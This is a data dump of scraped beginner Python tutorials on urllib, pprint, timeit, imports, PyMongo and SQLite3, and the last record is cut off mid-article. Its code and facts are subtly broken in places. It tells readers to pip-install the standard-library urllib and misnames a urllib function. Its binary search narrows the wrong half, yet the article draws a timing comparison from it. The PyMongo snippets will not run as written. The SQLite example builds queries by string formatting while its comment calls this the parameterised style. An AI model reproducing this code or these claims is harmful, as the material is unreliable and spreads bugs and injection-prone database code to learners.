    "tensor": null,
    "mime_type": null,
    "text": "Urllib package is the URL handling module for python. It is used to fetch URLs (Uniform Resource Locators). It uses the urlopen function and is able to fetch URLs using a variety of different protocols.Urllib is a package that collects several modules for working with URLs, such as:urllib.request for opening and reading.urllib.parse for parsing URLsurllib.error for the exceptions raisedurllib.robotparser for parsing robot.txt filesIf urllib is not present in your environment, execute the below code to install it.\r\npip install urllib\r\nLet\u2019s see these in details.urllib.requestThis module helps to define functions and classes to open URLs (mostly HTTP). One of the most simple ways to open such URLs is :urllib.request.urlopen(url)We can see this in an example:import urllib.requestrequest_url = urllib.request.urlopen('https://www.geeksforgeeks.org/')print(request_url.read())\r\nThe source code of the URL i.e. Geeksforgeeks.\r\nurllib.parseThis module helps to define functions to manipulate URLs and their components parts, to build or break them. It usually focuses on splitting a URL into small components; or joining different URL components into URL strings.We can see this from the below code:from urllib.parse import * parse_url = urlparse('https://www.geeksforgeeks.org / python-langtons-ant/')print(parse_url)print(\"\\n\")unparse_url = urlunparse(parse_url)print(unparse_url)\r\nParseResult(scheme='https', netloc='www.geeksforgeeks.org', path='/python-langtons-ant/', params='', query='', fragment='')\r\n\r\nhttps://www.geeksforgeeks.org/python-langtons-ant/\r\nNote:- The different components of a URL are separated and joined again. Try using some other URL for better understanding.Different other functions of urllib.parse are :FunctionUseurllib.parse.urlparseSeparates different components of URLurllib.parse.urlunparseJoin different components of URLurllib.parse.urlsplitIt is similar to urlparse() but doesn\u2019t split the paramsurllib.parse.urlunsplitCombines the tuple element returned by urlsplit() to form URLurllib.parse.urldeflagIf URL contains fragment, then it returns a URL removing the fragment.urllib.errorThis module defines the classes for exception raised by urllib.request. Whenever there is an error in fetching a URL, this module helps in raising exceptions. The following are the exceptions raised :URLError \u2013 It is raised for the errors in URLs, or errors while fetching the URL due to connectivity, and has a \u2018reason\u2019 property that tells a user the reason of error.HTTPError \u2013 It is raised for the exotic HTTP errors, such as the authentication request errors. It is a subclass or URLError. Typical errors include \u2018404\u2019 (page not found), \u2018403\u2019 (request forbidden),and \u2018401\u2019 (authentication required).We can see this in following examples :# URL Error\u00a0\u00a0import urllib.requestimport urllib.parse\u00a0\u00a0# trying to read the URL but with no internet connectivitytry:\u00a0\u00a0\u00a0\u00a0x = urllib.request.urlopen('https://www.google.com')\u00a0\u00a0\u00a0\u00a0print(x.read())\u00a0\u00a0# Catching the exception generated\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e :\u00a0\u00a0\u00a0\u00a0print(str(e))\r\nURL Error: urlopen error [Errno 11001] getaddrinfo failed\r\n# HTTP Error\u00a0\u00a0import urllib.requestimport urllib.parse\u00a0\u00a0# trying to read the URLtry:\u00a0\u00a0\u00a0\u00a0x = urllib.request.urlopen('https://www.google.com / search?q = test')\u00a0\u00a0\u00a0\u00a0print(x.read())\u00a0\u00a0# Catching the exception generated\u00a0\u00a0\u00a0\u00a0except Exception as e :\u00a0\u00a0\u00a0\u00a0print(str(e))\r\nHTTP Error 403: Forbidden\r\nurllib.robotparserThis module contains a single class, RobotFileParser. This class answers question about whether or not a particular user can fetch a URL that published robot.txt files. Robots.txt is a text file webmasters create to instruct web robots how to crawl pages on their website. The robot.txt file tells the web scraper about what parts of the server should not be accessed.For example :# importing robot parser classimport urllib.robotparser as rb\u00a0\u00a0bot = rb.RobotFileParser()\u00a0\u00a0# checks where the website's robot.txt file residex = bot.set_url('https://www.geeksforgeeks.org / robot.txt')print(x)\u00a0\u00a0# reads the filesy = bot.read()print(y)\u00a0\u00a0# we can crawl the main sitez = bot.can_fetch('*', 'https://www.geeksforgeeks.org/')print(z)\u00a0\u00a0# but can not crawl the disallowed urlw = bot.can_fetch('*', 'https://www.geeksforgeeks.org / wp-admin/')print(w)\r\nNone\r\nNone\r\nTrue\r\nFalse\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f37ea3ae20e66e8cd6f189b3a1017cc6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article is about a pretty useful built-in module in Python, pprint.The pprint module provides a capability to \u201cpretty-print\u201d arbitrary Python data structures in a well-formatted and more readable way!Let us consider an example:# A python code without pprintimport requests\u00a0def geocode(address):\u00a0\u00a0\u00a0\u00a0url = \"https://maps.googleapis.com/maps/api/geocode/json\"\u00a0\u00a0\u00a0\u00a0resp = requests.get(url, params = {'address': address})\u00a0\u00a0\u00a0\u00a0return resp.json()\u00a0# calling geocode functiondata = geocode('India gate')\u00a0# printing json responseprint(data)The above code is for getting the geocode information of a place using Google Maps API in JSON format.The output of above program looks like this:{'status': 'OK', 'results': [{'address_components': [{'long_name': 'Rajpath', 'types': ['route'], \n'short_name': 'Rajpath'}, {'long_name': 'India Gate', 'types': ['political', 'sublocality', \n'sublocality_level_1'], 'short_name': 'India Gate'}, {'long_name': 'New Delhi', 'types': \n['locality', 'political'], 'short_name': 'New Delhi'}, {'long_name': 'New Delhi', \n'types': ['administrative_area_level_2', 'political'], 'short_name': 'New Delhi'}, {'long_name': \n'Delhi', 'types': ['administrative_area_level_1', 'political'], 'short_name': 'DL'}, {'long_name': \n'India', 'types': ['country', 'political'], 'short_name': 'IN'}, {'long_name': '110001', 'types': \n['postal_code'], 'short_name': '110001'}], 'geometry': {'location': {'lng': 77.2295097, 'lat': 28.612912}, \n'viewport': {'northeast': {'lng': 77.2308586802915, 'lat': 28.6142609802915}, 'southwest': {'lng': \n77.22816071970848, 'lat': 28.6115630197085}}, 'location_type': 'APPROXIMATE'}, 'types': \n['establishment', 'point_of_interest'], 'formatted_address': 'Rajpath, India Gate, New Delhi, Delhi 110001, \nIndia', 'place_id': 'ChIJC03rqdriDDkRXT6SJRGXFwc'}]}As you can see, this output is not properly indented which affects readability for nested data structures.Now, consider the code below:# A python code with pprintimport requestsfrom pprint import pprint\u00a0def geocode(address):\u00a0\u00a0\u00a0\u00a0url = \"https://maps.googleapis.com/maps/api/geocode/json\"\u00a0\u00a0\u00a0\u00a0resp = requests.get(url, params = {'address': address})\u00a0\u00a0\u00a0\u00a0return resp.json()\u00a0# calling geocode functiondata = geocode('India gate')\u00a0# pretty-printing json responsepprint(data)The output of above code looks like this:{'results': [{'address_components': [{'long_name': 'Rajpath',\n                                      'short_name': 'Rajpath',\n                                      'types': ['route']},\n                                     {'long_name': 'India Gate',\n                                      'short_name': 'India Gate',\n                                      'types': ['political',\n                                                'sublocality',\n                                                'sublocality_level_1']},\n                                     {'long_name': 'New Delhi',\n                                      'short_name': 'New Delhi',\n                                      'types': ['locality', 'political']},\n                                     {'long_name': 'New Delhi',\n                                      'short_name': 'New Delhi',\n                                      'types': ['administrative_area_level_2',\n                                                'political']},\n                                     {'long_name': 'Delhi',\n                                      'short_name': 'DL',\n                                      'types': ['administrative_area_level_1',\n                                                'political']},\n                                     {'long_name': 'India',\n                                      'short_name': 'IN',\n                                      'types': ['country', 'political']},\n                                     {'long_name': '110001',\n                                      'short_name': '110001',\n                                      'types': ['postal_code']}],\n              'formatted_address': 'Rajpath, India Gate, New Delhi, Delhi '\n                                   '110001, India',\n              'geometry': {'location': {'lat': 28.612912, 'lng': 77.2295097},\n                           'location_type': 'APPROXIMATE',\n                           'viewport': {'northeast': {'lat': 28.6142609802915,\n                                                      'lng': 77.2308586802915},\n                                        'southwest': {'lat': 28.6115630197085,\n                                                      'lng': 77.22816071970848}}},\n              'place_id': 'ChIJC03rqdriDDkRXT6SJRGXFwc',\n              'types': ['establishment', 'point_of_interest']}],\n 'status': 'OK'}\nAs you can see, the output is now well formatted and much more readable.All we did was to import the pprint function of pprint module. And use pprint() function rather than the print function!This blog is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "308c0ccf32a90014efed2bfe53584960",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article will introduce you to a method of measuring the execution time of your python code snippets.\u00a0We will be using an in-built python library timeit.This module provides a simple way to find the execution time of small bits of Python code.Why timeit?\u00a0\u00a0Well, how about using a simple time module? Just save the time before and after the execution of code and subtract them! But this method is not precise as there might be a background process momentarily running which disrupts the code execution and you will get significant variations in the running time of small code snippets.timeit runs your snippet of code millions of times (default value is 1000000) so that you get the statistically most relevant measurement of code execution time!timeit is pretty simple to use and has a command-line interface as well as a callable one.So now, let\u2019s start exploring this handy library!The module function timeit.timeit(stmt, setup, timer, number) accepts four arguments:\u00a0stmt which is the statement you want to measure; it defaults to \u2018pass\u2019.setup which is the code that you run before running the stmt; it defaults to \u2018pass\u2019.\u00a0We generally use this to import the required modules for our code.timer which is a timeit.Timer object; it usually has a sensible default value so you don\u2019t have to worry about it.number which is the number of executions you\u2019d like to run the stmt.Where the timeit.timeit() function returns the number of seconds it took to execute the code.Example 1Let us see a basic example first.\u00a0\u00a0Python3# importing the required moduleimport timeit\u00a0# code snippet to be executed only oncemysetup = \"from math import sqrt\"\u00a0# code snippet whose execution time is to be measuredmycode = '''def example():\u00a0\u00a0\u00a0\u00a0mylist = []\u00a0\u00a0\u00a0\u00a0for x in range(100):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist.append(sqrt(x))'''\u00a0# timeit statementprint (timeit.timeit(setup = mysetup,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = mycode,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000))The output of above program will be the execution time(in seconds) for 10000 iterations of the code snippet passed to timeit.timeit() function.Note: Pay attention to the fact that the output is the execution time of number times iteration of the code snippet, not the single iteration. For a single iteration exec. time, divide the output time by number.The program is pretty straight-forward. All we need to do is to pass the code as a string to the timeit.timeit() function.It is advisable to keep the import statements and other static pieces of code in setup argument.Example 2Let\u2019s see another practical example in which we will compare two searching techniques, namely, Binary search and Linear search.\u00a0Also, here I demonstrate two more features, timeit.repeat function and calling the functions already defined in our program.\u00a0Python3# importing the required modulesimport timeit\u00a0# binary search functiondef binary_search(mylist, find):\u00a0\u00a0\u00a0\u00a0while len(mylist) > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mid = (len(mylist))//2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if mylist[mid] == find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif mylist[mid] < find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist = mylist[:mid]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist = mylist[mid + 1:]\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# linear search functiondef linear_search(mylist, find):\u00a0\u00a0\u00a0\u00a0for x in mylist:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if x == find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# compute binary search timedef binary_time():\u00a0\u00a0\u00a0\u00a0SETUP_CODE = '''from __main__ import binary_searchfrom random import randint'''\u00a0\u00a0\u00a0\u00a0\u00a0TEST_CODE = '''mylist = [x for x in range(10000)]find = randint(0, len(mylist))binary_search(mylist, find)'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# timeit.repeat statement\u00a0\u00a0\u00a0\u00a0times = timeit.repeat(setup = SETUP_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = TEST_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0repeat = 3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000)\u00a0\u00a0\u00a0\u00a0\u00a0# printing minimum exec. time\u00a0\u00a0\u00a0\u00a0print('Binary search time: {}'.format(min(times)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# compute linear search timedef linear_time():\u00a0\u00a0\u00a0\u00a0SETUP_CODE = '''from __main__ import linear_searchfrom random import randint'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TEST_CODE = '''mylist = [x for x in range(10000)]find = randint(0, len(mylist))linear_search(mylist, find)\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0# timeit.repeat statement\u00a0\u00a0\u00a0\u00a0times = timeit.repeat(setup = SETUP_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = TEST_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0repeat = 3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000)\u00a0\u00a0\u00a0\u00a0\u00a0# printing minimum exec. time\u00a0\u00a0\u00a0\u00a0print('Linear search time: {}'.format(min(times)))\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0linear_time()\u00a0\u00a0\u00a0\u00a0binary_time()The output of above program will be the minimum value in the list times.\u00a0This is how a sample output looks like:\u00a0strate below how you can utilize the command lintimeit.repeat() function accepts one extra argument, repeat. The output will be a list of the execution times of all code runs repeated a specified no. of times.In setup argument, we passed:\u00a0from __main__ import binary_search\nfrom random import randintThis will import the definition of function binary_search, already defined in the program and random library function randint.As expected, we notice that execution time of binary search is significantly lower than linear search!Example 3\u00a0Finally, I demonstrate below how you can utilize the command line interface of timeit module:Here I explain each term individually:\u00a0\u00a0So, this was a brief yet concise introduction to timeit module and its practical applications.\u00a0Its a pretty handy tool for python programmers when they need a quick glance of the execution time of their code snippets.This article is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "96cc8c9a7cad0d741ec380c73c822a7c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Import in python is similar to #include header_file in C/C++. Python modules can get access to code from another module by importing the file/function using import. The import statement is the most common way of invoking the import machinery, but it is not the only way.import module_name\u00a0When the import is used, it searches for the module initially in the local scope by calling __import__() function. The value returned by the function is then reflected in the output of the initial code.\u00a0PYTHONimport mathprint(math.pi)Output:3.141592653589793import module_name.member_name\u00a0In the above code module, math is imported, and its variables can be accessed by considering it to be a class and pi as its object.\u00a0The value of pi is returned by __import__().\u00a0pi as a whole can be imported into our initial code, rather than importing the whole module.\u00a0PYTHONfrom math import pi\u00a0# Note that in the above example,# we used math.pi. Here we have used# pi directly.print(pi)Output:3.141592653589793\u00a0from module_name import *\u00a0In the above code module, math is not imported, rather just pi has been imported as a variable.\u00a0All the functions and constants can be imported using *.\u00a0PYTHONfrom math import *print(pi)print(factorial(6))Output:3.141592653589793\n720As said above import uses __import__() to search for the module, and if not found, it would raise ImportError\u00a0PYTHONimport mathematicsprint(mathematics.pi)Output:Traceback (most recent call last):\n  File \"C:/Users/GFG/Tuples/xxx.py\", line 1, in \n    import mathematics\nImportError: No module named 'mathematics'This article is contributed by Piyush Doorwar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "94d1925a5a0ba2aa2536524579f80cd8",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : MongoDB : An introductionMongoDB is a cross-platform, document-oriented database that works on the concept of collections and documents. MongoDB offers high speed, high availability, and high scalability.The next question which arises in the mind of the people is \u201cWhy MongoDB\u201d?Reasons to opt for MongoDB :It supports hierarchical data structure (Please refer docs for details)It supports associate arrays like Dictionaries in Python.Built-in Python drivers to connect python-application with Database. Example- PyMongoIt is designed for Big Data.Deployment of MongoDB is very easy.MongoDB vs RDBMSMongoDB and PyMongo Installation GuideFirst start MongoDB from command prompt using :Method 1:mongodorMethod 2:net start MongoDBSee port number by default is set 27017 (last line in above image).Python has a native library for MongoDB. The name of the available library is \u201cPyMongo\u201d. To import this, execute the following command:from pymongo import MongoClientCreate a connection : The very first after importing the module is to create a MongoClient.from pymongo import MongoClientclient = MongoClient()After this, connect to the default host and port. Connection to the host and port is done explicitly. The following command is used to connect the MongoClient on the localhost which runs on port number 27017.client = MongoClient(\u2018host\u2019, port_number)example:- client = MongoClient(\u2018localhost\u2019, 27017)It can also be done using the following command:client = MongoClient(\u201cmongodb://localhost:27017/\u201d)Access DataBase Objects : To create a database or switch to an existing database we use:Method 1 : Dictionary-stylemydatabase = client[\u2018name_of_the_database\u2019]Method2 :mydatabase = client.name_of_the_databaseIf there is no previously created database with this name, MongoDB will implicitly create one for the user.Note : The name of the database fill won\u2019t tolerate any dash (-) used in it. The names like my-Table will raise an error. So, underscore are permitted to use in the name.Accessing the Collection : Collections are equivalent to Tables in RDBMS. We access a collection in PyMongo in the same way as we access the Tables in the RDBMS. To access the table, say table name \u201cmyTable\u201d of the database, say \u201cmydatabase\u201d.Method 1:mycollection = mydatabase[\u2018myTable\u2019]Method 2 :mycollection = mydatabase.myTable>MongoDB store the database in the form of dictionaries as shown:>\r\nrecord = {\r\ntitle: 'MongoDB and Python', \r\ndescription: 'MongoDB is no SQL database', \r\ntags: ['mongodb', 'database', 'NoSQL'], \r\nviewers: 104 \r\n} \u2018_id\u2019 is the special key which get automatically added if the programmer forgets to add explicitly. _id is the 12 bytes hexadecimal number which assures the uniqueness of every inserted document.Insert the data inside a collection :Methods used:insert_one() or insert_many()We normally use insert_one() method document into our collections. Say, we wish to enter the data named as record into the \u2019myTable\u2019 of \u2018mydatabase\u2019.rec = myTable.insert_one(record)The whole code looks likes this when needs to be implemented.# importing modulefrom pymongo import MongoClient\u00a0\u00a0# creation of MongoClientclient=MongoClient()\u00a0\u00a0# Connect with the portnumber and hostclient = MongoClient(\u201cmongodb://localhost:27017/\u201d)\u00a0\u00a0# Access databasemydatabase = client[\u2018name_of_the_database\u2019]\u00a0\u00a0# Access collection of the databasemycollection=mydatabase[\u2018myTable\u2019]\u00a0\u00a0# dictionary to be added in the databaserec={title: 'MongoDB and Python',\u00a0description: 'MongoDB is no SQL database',\u00a0tags: ['mongodb', 'database', 'NoSQL'],\u00a0viewers: 104\u00a0}\u00a0\u00a0# inserting the data in the databaserec = mydatabase.myTable.insert(record)Querying in MongoDB : There are certain query functions which are used to filer the data in the database. The two most commonly used functions are:find()find() is used to get more than one single document as a result of query.for i in mydatabase.myTable.find({title: 'MongoDB and Python'})\u00a0\u00a0\u00a0\u00a0print(i)This will output all the documents in the myTable of mydatabase whose title is \u2018MongoDB and Python\u2019.count()count() is used to get the numbers of documents with the name as passed int he parameters.print(mydatabase.myTable.count({title: 'MongoDB and Python'}))This will output the numbers of documents in the myTable of mydatabase whose title is \u2018MongoDB and Python\u2019.These two query functions can be summed to give a give the most filtered result as shown below.print(mydatabase.myTable.find({title: 'MongoDB and Python'}).count())To print all the documents/entries inside \u2018myTable\u2019 of database \u2018mydatabase\u2019 : Use the following code:from pymongo import MongoClient\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0conn = MongoClient()\u00a0\u00a0\u00a0\u00a0print(\"Connected successfully!!!\")except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Could not connect to MongoDB\")\u00a0\u00a0# database name: mydatabasedb = conn.mydatabase\u00a0\u00a0# Created or Switched to collection names: myTablecollection = db.myTable\u00a0\u00a0# To find() all the entries inside collection name 'myTable'cursor = collection.find()for record in cursor:\u00a0\u00a0\u00a0\u00a0print(record)This article is contributed by Rishabh Bansal and Shaurya Uppal.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "73a93e507c221e628d37b2f4a8b2dc93",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, integrating SQLite3 with Python is discussed. Here we will discuss all the CRUD operations on the SQLite3 database using Python. CRUD contains four major operations \u2013\u00a0Note: This needs a basic understanding of SQL.\u00a0Here, we are going to connect SQLite with Python. Python has a native library for SQLite3 called sqlite3. Let us explain how it works.\u00a0Connecting to SQLite DatabaseTo use SQLite, we must import sqlite3.import sqlite3Then create a connection using connect() method and pass the name of the database you want to access if there is a file with that name, it will open that file. Otherwise, Python will create a file with the given name.sqliteConnection = sqlite3.connect('gfg.db')After this, a cursor object is called to be capable to send commands to the SQL.\u00a0cursor = sqliteConnection.cursor()Example: Connecting to SQLite3 database using PythonPython3import sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# print statement will execute if there# are no errorsprint(\"Connected to the database\")\u00a0\u00a0# close the connectionconnection.close()Output:Connected to the databaseCursor ObjectBefore moving further to SQLite3 and Python let\u2019s discuss the cursor object in brief.\u00a0The cursor object is used to make the connection for executing SQL queries.It acts as middleware between SQLite database connection and SQL query. It is created after giving connection to SQLite database.\u00a0The cursor is a control structure used to traverse and fetch the records of the database.\u00a0All the commands will be executed using cursor object only.Executing SQLite3 Queries \u2013 Creating TablesAfter connecting to the database and creating the cursor object let\u2019s see how to execute the queries.To execute a query in the database, create an object and write the SQL command in it with being commented. Example:- sql_comm = \u201dSQL statement\u201dAnd executing the command is very easy. Call the cursor method execute() and pass the name of the sql command as a parameter in it. Save a number of commands as the sql_comm and execute them. After you perform all your activities, save the changes in the file by committing those changes and then lose the connection.\u00a0Example: Creating SQLite3 tables using PythonIn this example, we will create the SQLite3 tables using Python. The standard SQL command will be used for creating the tables.Pythonimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# SQL command to create a table in the databasesql_command = \"\"\"CREATE TABLE emp (\u00a0staff_number INTEGER PRIMARY KEY,\u00a0fname VARCHAR(20),\u00a0lname VARCHAR(30),\u00a0gender CHAR(1),\u00a0joining DATE);\"\"\"\u00a0\u00a0# execute the statementcrsr.execute(sql_command)\u00a0\u00a0# close the connectionconnection.close()Output:Inserting into TableTo insert data into the table we will again write the SQL command as a string and will use the execute() method.Example 1: Inserting Data into SQLite3 table using PythonPython3# Python code to demonstrate table creation and# insertions with SQL\u00a0\u00a0# importing moduleimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# SQL command to insert the data in the tablesql_command = \"\"\"INSERT INTO emp VALUES (23, \"Rishabh\",\\\"Bansal\", \"M\", \"2014-03-28\");\"\"\"crsr.execute(sql_command)\u00a0\u00a0# another SQL command to insert the data in the tablesql_command = \"\"\"INSERT INTO emp VALUES (1, \"Bill\", \"Gates\",\\\"M\", \"1980-10-28\");\"\"\"crsr.execute(sql_command)\u00a0\u00a0# To save the changes in the files. Never skip this.# If we skip this, nothing will be saved in the database.connection.commit()\u00a0\u00a0# close the connectionconnection.close()Output:Example 2: Inserting data input by the userPython3# importing moduleimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# primary keypk = [2, 3, 4, 5, 6]\u00a0\u00a0# Enter 5 students first namesf_name = ['Nikhil', 'Nisha', 'Abhinav', 'Raju', 'Anshul']\u00a0\u00a0# Enter 5 students last namesl_name = ['Aggarwal', 'Rawat', 'Tomar', 'Kumar', 'Aggarwal']\u00a0\u00a0# Enter their gender respectivelygender = ['M', 'F', 'M', 'M', 'F']\u00a0\u00a0# Enter their jpining data respectivelydate = ['2019-08-24', '2020-01-01', '2018-05-14', '2015-02-02', '2018-05-14']\u00a0\u00a0for i in range(5):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# This is the q-mark style:\u00a0\u00a0\u00a0\u00a0crsr.execute(f'INSERT INTO emp VALUES ({pk[i]}, \"{f_name[i]}\", \"{l_name[i]}\", \"{gender[i]}\", \"{date[i]}\")')\u00a0\u00a0# To save the changes in the files. Never skip this.# If we skip this, nothing will be saved in the database.connection.commit()\u00a0\u00a0# close the connectionconnection.close()Output:Fetching DataIn this section, we have discussed how to create a table and how to add new rows in the database. Fetching the data from records is simple as inserting them. The execute method uses the SQL command of getting all the data from the table using \u201cSelect * from table_name\u201d and all the table data can be fetched in an object in the form of a list of lists.Example: Reading Data from sqlite3 table using PythonPython# importing the moduleimport sqlite3\u00a0\u00a0# connect withe the myTable databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursor objectcrsr = connection.cursor()\u00a0\u00a0# execute the command to fetch all the data from the table empcrsr.execute(\"SELECT * FROM emp\")\u00a0\u00a0# store all the fetched data in the ans variableans = crsr.fetchall()\u00a0\u00a0# Since we have already selected all the data entries# using the \"SELECT *\" SQL command and stored them in# the ans variable, all we need to do now is to print# out the ans variablefor i in ans:\u00a0\u00a0\u00a0\u00a0print(i)Output:Note: It should be noted that the database file that will be created will be in the same folder as that of the python file. If we wish to change the path of the file, change the path while opening the file.Updating DataFor updating the data in the SQLite3 table we will use the UPDATE statement. We can update single columns as well as multiple columns using the UPDATE statement as per our requirement.UPDATE table_name SET column1 = value1, column2 = value2,\u2026  \r\nWHERE condition; In the above syntax, the SET statement is used to set new values to the particular column, and the WHERE clause is used to select the rows for which the columns are needed to be updated.\u00a0Example: Updating SQLite3 table using PythonPython3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''UPDATE emp SET lname = \"Jyoti\" WHERE fname=\"Rishabh\";''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the connectionconn.close()Output:Deleting DataFor deleting the data from the SQLite3 table we can use the delete command.\u00a0DELETE FROM table_name [WHERE Clause]Example: Deleting from SQLite3 table using PythonPython3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''DELETE FROM emp WHERE fname=\"Rishabh\";''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the 